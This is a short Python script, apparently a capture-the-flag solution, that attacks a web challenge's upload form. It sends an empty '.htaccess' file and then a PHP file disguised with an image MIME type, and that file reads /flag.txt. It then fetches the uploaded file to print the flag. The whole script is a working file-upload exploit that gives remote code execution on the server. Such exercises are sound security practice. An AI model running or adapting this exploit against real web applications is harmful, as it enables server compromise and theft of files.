#!/usr/bin/python3

import requests
import tempfile

URL="http://localhost:8080"
URL="https://4f6c59af-29e2-4206-a17d-936919a644b6.library.m0unt41n.ch:31337"
(_, TMPFILE) = tempfile.mkstemp()

open(TMPFILE, "w").write("")
requests.post(URL+"/submit.php",
              data={'email': 'user@gmail.com', 'description': 'My complaint'},
              files={'file': ('.htaccess', open(TMPFILE, "rb"), 'image/gif')})

open(TMPFILE, "w").write("<?php echo file_get_contents(\"/flag.txt\") ?>")
requests.post(URL+"/submit.php",
              data={'email': 'user@gmail.com', 'description': 'My complaint'},
              files={'file': ('exploit.php', open(TMPFILE, "rb"), 'image/gif')})

print(requests.get(URL+"/uploads/exploit.php").text)
